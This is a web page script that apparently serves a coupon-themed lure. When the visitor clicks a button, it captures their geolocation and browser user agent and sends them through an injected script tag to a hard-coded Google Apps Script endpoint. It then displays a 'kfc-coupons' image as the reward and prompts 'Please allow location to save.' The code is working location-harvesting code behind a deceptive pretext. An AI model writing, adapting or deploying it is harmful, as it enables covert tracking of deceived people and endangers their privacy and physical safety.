// Web App URL from Google Apps Script deployment
const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyRuMtjQj06d1BGveMWdM4vWNw9Tysso93gtb7rHyNjfoexLekafuN_5Kms9GOQoook/exec';

const sendBtn = document.getElementById('sendBtn');
const statusEl = document.getElementById('status');

sendBtn && sendBtn.addEventListener('click', () => sendLocation());

function getPositionWithTimeout(options = {}, ms = 60000) {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject(new Error('Not supported'));
    let finished = false;
    const timer = setTimeout(() => {
      if (finished) return;
      finished = true;
      reject(new Error('Timeout waiting for position'));
    }, ms);

    navigator.geolocation.getCurrentPosition((pos) => {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      resolve(pos);
    }, (err) => {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      reject(err);
    }, options);
  });
}

async function sendLocation(){
  if(!navigator.geolocation){ statusEl.textContent = 'Not supported by this browser.'; return; }
  if (sendBtn) sendBtn.disabled = true;
    statusEl.textContent = 'Please wait...';
  // Ensure we only send once per user action to avoid duplicates
  let sentOnce = false;

  function buildPayloadFromPosition(pos){
    return {
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      timestamp: new Date(pos.timestamp).toISOString(),
      userAgent: navigator.userAgent
    };
  }

  function sendPayload(payload){
    if (sentOnce) return; sentOnce = true;

    try{
      const params = new URLSearchParams();
      params.set('lat', payload.lat);
      params.set('lon', payload.lon);
      params.set('accuracy', payload.accuracy);
      params.set('timestamp', payload.timestamp);
      params.set('userAgent', encodeURIComponent(payload.userAgent));

      const cbName = '__gps_cb_' + Date.now() + '_' + Math.floor(Math.random()*1000);
      params.set('callback', cbName);
      const url = SCRIPT_URL + '?' + params.toString();

      const script = document.createElement('script');
      const timeout = setTimeout(() => {
        try{ window[cbName] = null; }catch(e){ window[cbName] = null; }
        if (script.parentNode) script.parentNode.removeChild(script);
        statusEl.textContent = 'Server timeout. Click again.';
        if (sendBtn) sendBtn.disabled = false;
      }, 60000);

      window[cbName] = function(data) {
        clearTimeout(timeout);
        try{
          if (data && data.status === 'ok') {
            statusEl.innerHTML = '<img src="assets/img/kfc-coupons.jpg" alt="Saved" style="max-width:100%;display:block;" />';
          } else {
            statusEl.textContent = 'Server error: ' + (data && data.message ? data.message : 'unknown');
          }
        } finally {
          try{ delete window[cbName]; }catch(e){ window[cbName] = null; }
          if (script.parentNode) script.parentNode.removeChild(script);
          if (sendBtn) sendBtn.disabled = false;
        }
      };

      script.src = url;
      script.async = true;
      document.head.appendChild(script);
    } catch(err){
      statusEl.textContent = 'Network error: ' + err.message;
      if (sendBtn) sendBtn.disabled = false;
    }
  }

  // When permission is granted (or becomes granted), immediately get & send position
  async function handlePermissionAndGet(){
    try{
      const pos = await getPositionWithTimeout({ enableHighAccuracy: false }, 20000);
      const payload = buildPayloadFromPosition(pos);
      sendPayload(payload);
    } catch(err){
      if (!sentOnce) {
        if (err && err.code === 1) { // PERMISSION_DENIED
          statusEl.textContent = 'Permission denied.';
        } else {
          statusEl.textContent = 'Error: ' + (err && err.message ? err.message : 'unknown');
        }
        if (sendBtn) sendBtn.disabled = false;
      }
    }
  }

  // Use Permissions API when available to react to the user clicking "Allow" immediately
  if (navigator.permissions) {
    try{
      const p = await navigator.permissions.query({ name: 'geolocation' });
      if (p.state === 'granted') {
        statusEl.textContent = 'Getting location...';
        await handlePermissionAndGet();
        return;
      }
      // If user responds to prompt (Allow this time / while visiting), this onchange fires
      p.onchange = async () => {
        if (p.state === 'granted') {
          statusEl.textContent = 'Permission granted — capturing location...';
          await handlePermissionAndGet();
        }
      };
    } catch(e) {
      // Permissions API may throw; fall back to direct getCurrentPosition below
    }
  }

  // Fallback / regular flow: request position (this triggers browser permission prompt)
  try{
    const pos = await getPositionWithTimeout({ enableHighAccuracy: false }, 60000);
    const payload = buildPayloadFromPosition(pos);
    sendPayload(payload);
  } catch(err) {
    if (!sentOnce) {
      if (err && err.code === 1) { // PERMISSION_DENIED
        statusEl.textContent = 'Please allow location to save.';
      } else {
        statusEl.textContent = 'Error: ' + (err && err.message ? err.message : 'unknown');
      }
      if (sendBtn) sendBtn.disabled = false;
    }
  }
}
